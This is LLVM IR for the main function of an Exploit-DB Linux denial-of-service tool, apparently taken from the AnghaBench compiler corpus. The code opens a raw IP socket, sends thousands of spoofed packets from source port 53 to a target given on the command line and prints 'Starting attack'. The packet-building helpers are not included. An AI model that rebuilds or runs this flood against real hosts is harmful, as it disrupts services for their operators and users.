; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_20566.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_20566.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [9 x i8] c"s:d:n:u:\00", align 1
@optarg = common dso_local global i32 0, align 4
@optind = common dso_local global i64 0, align 8
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [23 x i8] c"setsockopt: IP_HDRINCL\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [27 x i8] c"\0AStarting attack on %s ...\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"\0ADone.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %7, align 4
  store i16 53, i16* %11, align 2
  store i16 16384, i16* %12, align 2
  store i32 20000, i32* %13, align 4
  store i32 15000, i32* %14, align 4
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %17, label %19

17:                                               ; preds = %2
  %18 = call i32 (...) @usage()
  br label %19

19:                                               ; preds = %17, %2
  br label %20

20:                                               ; preds = %45, %19
  %21 = load i32, i32* %4, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = call i32 @getopt(i32 %21, i8** %22, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  store i32 %23, i32* %8, align 4
  %24 = icmp ne i32 %23, -1
  br i1 %24, label %25, label %46

25:                                               ; preds = %20
  %26 = load i32, i32* %8, align 4
  switch i32 %26, label %43 [
    i32 115, label %27
    i32 100, label %31
    i32 110, label %35
    i32 117, label %39
  ]

27:                                               ; preds = %25
  %28 = load i32, i32* @optarg, align 4
  %29 = call i8* @atoi(i32 %28)
  %30 = ptrtoint i8* %29 to i16
  store i16 %30, i16* %11, align 2
  br label %45

31:                                               ; preds = %25
  %32 = load i32, i32* @optarg, align 4
  %33 = call i8* @atoi(i32 %32)
  %34 = ptrtoint i8* %33 to i16
  store i16 %34, i16* %12, align 2
  br label %45

35:                                               ; preds = %25
  %36 = load i32, i32* @optarg, align 4
  %37 = call i8* @atoi(i32 %36)
  %38 = ptrtoint i8* %37 to i32
  store i32 %38, i32* %14, align 4
  br label %45

39:                                               ; preds = %25
  %40 = load i32, i32* @optarg, align 4
  %41 = call i8* @atoi(i32 %40)
  %42 = ptrtoint i8* %41 to i32
  store i32 %42, i32* %13, align 4
  br label %45

43:                                               ; preds = %25
  %44 = call i32 (...) @usage()
  br label %45

45:                                               ; preds = %43, %39, %35, %31, %27
  br label %20

46:                                               ; preds = %20
  %47 = load i64, i64* @optind, align 8
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = sub nsw i64 %49, %47
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %4, align 4
  %52 = load i64, i64* @optind, align 8
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 %52
  store i8** %54, i8*** %5, align 8
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 0
  %57 = load i8*, i8** %56, align 8
  %58 = call i64 @resolve(i8* %57)
  store i64 %58, i64* %9, align 8
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i64 @resolve(i8* %61)
  store i64 %62, i64* %10, align 8
  %63 = call i32 @time(i32 0)
  %64 = call i32 (...) @getpid()
  %65 = mul nsw i32 %63, %64
  %66 = call i32 @srandom(i32 %65)
  %67 = load i32, i32* @AF_INET, align 4
  %68 = load i32, i32* @SOCK_RAW, align 4
  %69 = load i32, i32* @IPPROTO_RAW, align 4
  %70 = call i32 @socket(i32 %67, i32 %68, i32 %69)
  store i32 %70, i32* %6, align 4
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %75

72:                                               ; preds = %46
  %73 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %74 = call i32 @exit(i32 1) #3
  unreachable

75:                                               ; preds = %46
  %76 = load i32, i32* %6, align 4
  %77 = load i32, i32* @IPPROTO_IP, align 4
  %78 = load i32, i32* @IP_HDRINCL, align 4
  %79 = bitcast i32* %7 to i8*
  %80 = call i64 @setsockopt(i32 %76, i32 %77, i32 %78, i8* %79, i32 4)
  %81 = icmp slt i64 %80, 0
  br i1 %81, label %82, label %85

82:                                               ; preds = %75
  %83 = call i32 @perror(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %84 = call i32 @exit(i32 1) #3
  unreachable

85:                                               ; preds = %75
  %86 = load i32, i32* @stdout, align 4
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i8* %89)
  store i32 0, i32* %8, align 4
  br label %91

91:                                               ; preds = %128, %85
  %92 = load i32, i32* %8, align 4
  %93 = load i32, i32* %14, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %131

95:                                               ; preds = %91
  %96 = load i32, i32* %6, align 4
  %97 = load i64, i64* %9, align 8
  %98 = load i32, i32* %8, align 4
  %99 = call i64 @htonl(i32 %98)
  %100 = add i64 %97, %99
  %101 = load i64, i64* %10, align 8
  %102 = load i16, i16* %11, align 2
  %103 = load i16, i16* %12, align 2
  %104 = call i32 @sendem(i32 %96, i64 %100, i64 %101, i16 zeroext %102, i16 zeroext %103)
  %105 = load i32, i32* %8, align 4
  %106 = srem i32 %105, 2
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %111, label %108

108:                                              ; preds = %95
  %109 = load i32, i32* %13, align 4
  %110 = call i32 @usleep(i32 %109)
  br label %111

111:                                              ; preds = %108, %95
  %112 = load i32, i32* %8, align 4
  %113 = srem i32 %112, 100
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %127, label %115

115:                                              ; preds = %111
  %116 = load i32, i32* %8, align 4
  %117 = srem i32 %116, 2000
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %122, label %119

119:                                              ; preds = %115
  %120 = load i32, i32* @stdout, align 4
  %121 = call i32 (i32, i8*, ...) @fprintf(i32 %120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  br label %122

122:                                              ; preds = %119, %115
  %123 = load i32, i32* @stdout, align 4
  %124 = call i32 (i32, i8*, ...) @fprintf(i32 %123, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %125 = load i32, i32* @stdout, align 4
  %126 = call i32 @fflush(i32 %125)
  br label %127

127:                                              ; preds = %122, %111
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %8, align 4
  br label %91

131:                                              ; preds = %91
  %132 = load i32, i32* @stdout, align 4
  %133 = call i32 (i32, i8*, ...) @fprintf(i32 %132, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %134 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @usage(...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i64 @resolve(i8*) #1

declare dso_local i32 @srandom(i32) #1

declare dso_local i32 @time(i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @sendem(i32, i64, i64, i16 zeroext, i16 zeroext) #1

declare dso_local i64 @htonl(i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @fflush(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
